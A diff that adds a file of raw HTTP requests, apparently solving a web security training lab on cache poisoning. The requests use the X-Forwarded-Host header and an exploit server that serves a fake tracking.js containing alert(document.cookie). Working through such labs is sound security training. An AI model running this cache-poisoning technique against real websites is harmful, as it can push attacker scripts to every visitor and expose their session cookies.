@@ -1,0 +1,15 @@
+GET / HTTP/1.1
+Host: ace41fc01fc3ea12c0c8303a00b80051.web-security-academy.net
+X-Forwarded-Host: 127.0.0.1
+
+POST / HTTP/1.1
+Host: exploit-acbf1fb91f3deafec002308601b20022.web-security-academy.net
+
+urlIsHttps=on&responseFile=%2Fresources%2Fjs%2Ftracking.js&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+application%2Fjavascript%3B+charset%3Dutf-8&responseBody=alert%28document.cookie%29%3B&formAction=STORE
+
+GET / HTTP/1.1
+Host: ace41fc01fc3ea12c0c8303a00b80051.web-security-academy.net
+X-Forwarded-Host: exploit-acbf1fb91f3deafec002308601b20022.web-security-academy.net
+
+GET /log HTTP/1.1
+Host: exploit-acbf1fb91f3deafec002308601b20022.web-security-academy.net
